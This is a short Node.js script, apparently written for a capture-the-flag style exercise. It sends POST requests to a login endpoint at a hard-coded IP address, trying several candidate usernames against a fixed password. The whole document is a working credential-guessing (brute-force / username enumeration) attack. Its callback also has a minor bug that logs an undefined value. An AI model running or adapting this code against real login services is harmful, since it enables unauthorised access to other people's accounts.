var request = require('request');

var listaAProbar = ["hola", "123", "estoesunaprueba", "anabel", "dawn"]




var datosActuales = {
    "username": "dawn",
    "pass": "123"
}






for (var user of listaAProbar){

    var options = {
        "method": "POST",
        "Content-Type": "application/x-www-form-urlencoded",
        "form": {
            "username": user,
            "password": datosActuales.pass
        }
    }
    request("http://35.227.24.107/dedbd41653/login", options, function(err, res, body, user){
        console.log(user)
    console.log(body);
    console.log("=========================")
})
console.log("HOLA!")
   

}




